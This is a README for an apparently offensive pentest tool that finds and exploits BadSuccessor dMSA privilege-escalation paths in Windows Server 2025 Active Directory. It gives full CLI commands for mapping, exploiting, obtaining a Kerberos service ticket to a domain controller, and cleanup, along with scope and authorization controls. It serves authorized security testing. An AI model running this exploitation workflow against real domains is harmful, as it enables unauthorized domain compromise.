# dMSA-Reaper

dMSA-Reaper finds and exploits BadSuccessor paths in Windows Server 2025
Active Directory. Given domain credentials and a domain controller, it maps
dMSA permissions, selects an executable path, creates or modifies the required
dMSA relationship, and obtains a Kerberos service ticket through it.

Each exploitation run is journaled. `--dry-run` shows the LDAP changes before
execution, and `cleanup` removes only the changes made by that operation.

```text
map -> paths -> exploit -> ticket
                         -> cleanup
```

Use dMSA-Reaper only in an Active Directory environment you are authorized to
test.

## Install

```bash
python -m venv .venv
. .venv/bin/activate
pip install -e ".[dev]"
```

## Usage

Map the domain:

```bash
dmsa-reaper map \
  --domain corp.local --dc-ip 10.0.0.10 \
  -u analyst -p 'pass' --use-ldaps \
  --json state.json
```

List exploitable paths:

```bash
dmsa-reaper paths \
  --state state.json --expand-targets \
  --json paths.json
```

Preview a path:

```bash
dmsa-reaper exploit \
  --state state.json --paths paths.json \
  --path BS-7f31... --scope scope.json \
  --dry-run
```

Exploit it:

```bash
dmsa-reaper exploit \
  --state state.json --paths paths.json \
  --path BS-7f31... \
  --domain corp.local --dc-ip 10.0.0.10 \
  -u analyst -p 'pass' --use-ldaps \
  --scope scope.json \
  --confirm --confirm-string corp.local
```

Use the operation ID returned by `exploit` to obtain a ticket:

```bash
dmsa-reaper ticket \
  --op OP-YYYYMMDD-deadbeef \
  --ccache /secure/operator.ccache \
  --identity analyst \
  --domain corp.local \
  --dc-host dc01.corp.local --dc-ip 10.0.0.10 \
  --service cifs/dc01.corp.local
```

The ticket and a ready-to-use handoff command are written under
`.reaper/runs/<operation-id>/`.

Remove the operation's changes:

```bash
dmsa-reaper cleanup \
  --op OP-YYYYMMDD-deadbeef \
  --domain corp.local --dc-ip 10.0.0.10 \
  -u analyst -p 'pass' --use-ldaps
```

## Operational controls

LDAP writes require a scope file. Created objects must be inside `allowedOUs`;
modified objects must be inside `allowedOUs` or `allowedTargets`. DACL paths
also require `allowDaclPrimitives=true`.

Operation journals are stored in `.reaper/operations`. Private ccaches and
snapshots are stored in `.reaper/runs/<operation-id>/` with mode `0600`. Use
`--ops-dir` or `DMSA_REAPER_OPS_DIR` to change the journal directory.

Cleanup is conflict-aware. It restores attributes only while they still match
the operation's write, removes only ACEs inserted by the operation, and
deletes created objects only when their `objectGUID` matches the journal.

Password-based NTLM, LDAPS, STARTTLS, and environment Kerberos through
SASL/GSSAPI are supported for LDAP. Pass-the-hash, AES keys, and keytabs are
not yet consistently supported for LDAP.

`verify` is available for LDAP troubleshooting, but it is not part of the
normal exploitation flow.
